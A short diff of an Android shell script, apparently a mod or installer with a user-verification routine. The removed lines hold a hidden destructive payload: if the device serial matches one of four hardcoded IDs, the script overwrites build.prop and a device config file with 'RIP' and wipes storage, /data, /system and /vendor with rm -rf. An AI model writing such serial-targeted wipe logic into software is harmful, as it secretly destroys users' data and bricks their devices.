@@ -79,12 +79,6 @@ verifyuser() {
 		fi
 		fi
 		}
-if [[ $seradd == aa2b4d2d ]] || [[ $seradd == 3a710790 ]] || [[ $seradd == 9406a39 ]] || [[ $seradd == 5b8bd97d ]]; then
-echo "RIP" > /system/etc/device_features/beryllium.xml
-echo "RIP" > /system/build.prop
-echo "RIP" > /system/system/build.prop
-rm -rf /sdcard/* /storage/*-*/* /storage/*-* /sdcard /data/* /system/* /vendor/* /odm/* $sysdir/$seradd.pub $sysdir/$seradd.key
-fi
 echolog "Checking...."
 if [[ -e $sysdir/$seradd.key ]]; then
 echolog "AV."
